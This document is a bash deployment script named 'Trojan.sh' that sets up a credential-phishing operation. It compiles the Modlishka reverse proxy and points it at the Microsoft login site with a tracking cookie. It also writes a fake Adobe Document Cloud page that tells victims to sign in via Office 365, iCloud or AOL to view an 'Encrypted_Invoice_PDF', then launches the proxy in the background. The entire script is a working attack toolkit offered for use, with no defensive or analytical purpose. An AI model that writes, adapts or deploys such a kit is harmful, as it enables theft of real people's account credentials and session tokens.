#!/bin/bash
# 🏛️ TROJAN.SH - SAFE NO-FREEZE DEPLOYER
# -----------------------------------------------
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}[+] Cleaning old traps and killing dots...${NC}"
# This line fixes the "Dotted Line" freeze automatically
tmux kill-server 2>/dev/null
sed -i '/byobu/d' ~/.bashrc
sed -i '/TMUX/d' ~/.bashrc

# 1. INSTALL SYSTEM CORE
echo -e "${GREEN}[+] Installing System Core...${NC}"
sudo apt update && sudo apt install -y golang-go git make certbot screen unzip software-properties-common

# 2. SETUP GO 1.24
if ! go version | grep -q "1.24"; then
    echo -e "${GREEN}[+] Updating to Go 1.24...${NC}"
    sudo add-apt-repository ppa:longsleep/golang-backports -y && sudo apt update
    sudo apt install golang-1.24-go -y
    sudo ln -sf /usr/lib/go-1.24/bin/go /usr/bin/go
fi

# 3. DOWNLOAD & COMPILE ENGINE
cd /root
if [ ! -d "engine" ]; then
    echo -e "${GREEN}[+] Downloading and Compiling Engine...${NC}"
    git clone https://github.com/drk1wi/Modlishka.git engine
    cd engine && make && cd ..
fi

# 4. SETUP DIRECTORIES
mkdir -p /var/www/adobe_gui

# 5. CREATE MASTER CONFIG
cat << 'EOF' > /root/config.json
{
  "proxyDomain": "yourdomain.com",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "terminateRedirectUrl": "https://www.adobe.com",
  "trackingCookie": "trj_sid",
  "rules": [
    { "name": "gui", "target": "/", "phishing": "/", "type": "static", "path": "/var/www/adobe_gui/index.php" }
  ]
}
EOF

# 6. AUTOMATED MULTI-PORTAL ADOBE GUI
cat << 'EOF' > /var/www/adobe_gui/index.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Adobe Document Cloud - Shared File</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f4f4; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; width: 400px; padding: 35px; border-radius: 4px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
        .logo { width: 55px; margin-bottom: 20px; }
        .btn { display: flex; align-items: center; padding: 12px 20px; border: 1px solid #dcdcdc; border-radius: 6px; cursor: pointer; text-decoration: none; color: #333; margin-bottom: 12px; transition: 0.2s; }
        .btn:hover { background: #fdfdfd; border-color: #0078d4; }
        .btn img { width: 24px; height: 24px; margin-right: 18px; }
        .o365 { border-left: 5px solid #eb3c00; }
        .icloud { border-left: 5px solid #000; }
        .aol { border-left: 5px solid #ff0000; }
    </style>
</head>
<body>
<div class="container">
    <img src="https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_Hex.svg" class="logo">
    <p>To view <b>"Encrypted_Invoice_PDF"</b>, please sign in with your email provider.</p>
    <div class="btn o365" onclick="location.href='/login'"><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">Office 365</div>
    <div class="btn icloud" onclick="location.href='/login'"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">iCloud</div>
    <div class="btn aol" onclick="location.href='/login'"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/AOL_logo.svg">AOL</div>
</div>
</body>
</html>
EOF

# 7. CREATE EASY RUN SCRIPT
cat << 'EOF' > /root/run.sh
#!/bin/bash
pkill proxy
screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
echo "Engine is LIVE in the background."
EOF
chmod +x /root/run.sh

# 8. SET SAFE ALIASES (NO DOTS)
echo "alias start='./run.sh'" >> ~/.bashrc
echo "alias logs='tail -f /root/engine/logs/proxy.log'" >> ~/.bashrc
echo "alias stop='pkill proxy && screen -wipe'" >> ~/.bashrc

echo -e "${GREEN}[+] Trojan.sh DEPLOYED.${NC}"
echo -e "${GREEN}[+] Type 'source ~/.bashrc' to activate.${NC}"
echo -e "${GREEN}[+] Type 'start' to go live!${NC}"
